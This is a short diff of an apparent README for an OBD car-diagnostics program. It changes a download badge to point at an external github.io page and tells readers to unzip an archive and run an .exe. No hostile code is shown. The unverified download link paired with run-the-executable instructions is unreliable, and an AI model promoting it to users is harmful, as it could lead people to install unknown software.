@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install MotorData OBD and connect your ELM327 adapter to begin diagnostics.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://motordata-obd.github.io/.github/)
 
 ## 📸 Overview
 <img width="1920" height="1200" alt="motordata-trip" src="https://github.com/user-attachments/assets/a19f80df-c8e6-45c6-9298-26cd1e928239" />
